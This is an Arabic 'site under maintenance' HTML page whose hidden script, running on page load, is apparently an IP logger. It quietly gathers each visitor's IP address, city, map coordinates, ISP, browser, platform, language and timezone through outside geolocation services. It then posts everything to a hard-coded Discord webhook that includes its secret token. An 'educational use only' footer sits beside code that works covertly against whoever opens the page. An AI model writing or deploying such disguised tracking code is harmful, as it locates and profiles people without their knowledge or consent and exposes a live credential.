<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>الموقع تحت الصيانة</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      color: #333;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      max-width: 600px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      padding: 20px;
    }
    h1 {
      color: #ff6b6b;
    }
    p {
      font-size: 18px;
      color: #666;
    }
    .maintenance-icon {
      font-size: 100px;
      color: #ff6b6b;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="maintenance-icon">🚧</div>
    <h1>الموقع تحت الصيانة</h1>
    <p>نعتذر عن الإزعاج. نحن نعمل على تحسين الموقع.</p>
  </div>
  <script>
    // رابط الويب هوك لديسكورد
    const webhookUrl = 'https://discord.com/api/webhooks/1281263004326826127/CwN2EjF6OfTMGkGlkvFPM7c4pjPyJGnpNEfSV1Vmgm3Y2GWidjX3yIWmlEhor_-ydyT-';

    // دالة للحصول على البيانات من API
    function fetchData(url) {
      return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.onreadystatechange = () => {
          if (xhr.readyState === 4 && xhr.status === 200) {
            resolve(JSON.parse(xhr.responseText));
          } else if (xhr.readyState === 4) {
            reject(`فشل في جلب البيانات من ${url}`);
          }
        };
        xhr.send();
      });
    }

    // دالة للحصول على معلومات المتصفح والجهاز
    function getBrowserInfo() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      return {
        المتصفح: userAgent,
        النظام: platform,
        اللغة: language,
        "المنطقة الزمنية": timezone
      };
    }

    // دالة لإرسال البيانات إلى ديسكورد
    async function sendToDiscord(ipInfo, ipAddress, browserInfo) {
      const payload = {
        username: "IP Logger",
        avatar_url: "https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png",
        embeds: [
          {
            title: "تم تسجيل دخول جديد",
            color: 5814783,
            fields: [
              { name: "عنوان IP", value: `\`${ipAddress}\``, inline: true },
              { name: "الموقع", value: `${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}`, inline: true },
              { name: "الإحداثيات", value: `[عرض على الخريطة](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})`, inline: true },
              { name: "مزود الخدمة", value: ipInfo.isp || "غير معروف", inline: true },
              { name: "التوقيت المحلي", value: ipInfo.timezone || "غير معروف", inline: true },
              { name: "العملة", value: ipInfo.currency || "غير معروف", inline: true },
              { name: "المتصفح", value: browserInfo["المتصفح"], inline: false },
              { name: "النظام", value: browserInfo["النظام"], inline: true },
              { name: "اللغة", value: browserInfo["اللغة"], inline: true },
              { name: "المنطقة الزمنية", value: browserInfo["المنطقة الزمنية"], inline: true }
            ],
            footer: {
              text: "IP Logger | للاستخدام التعليمي فقط",
              icon_url: "https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png"
            },
            timestamp: new Date().toISOString()
          }
        ]
      };

      const xhr = new XMLHttpRequest();
      xhr.open("POST", webhookUrl);
      xhr.setRequestHeader("Content-type", "application/json");
      xhr.send(JSON.stringify(payload));
    }

    // الدالة الرئيسية لجمع البيانات وإرسالها
    async function logIP() {
      try {
        // جلب معلومات الـ IP والموقع
        const ipInfo = await fetchData("http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,timezone,currency,isp,query");
        const ipAddress = await fetchData("https://api.ipify.org/?format=json");

        // جلب معلومات المتصفح والجهاز
        const browserInfo = getBrowserInfo();

        // إرسال جميع البيانات إلى ديسكورد
        sendToDiscord(ipInfo, ipAddress.query, browserInfo);
      } catch (error) {
        console.error("خطأ أثناء جلب البيانات:", error);
      }
    }

    // تشغيل الدالة
    logIP();
  </script>
</body>
</html>
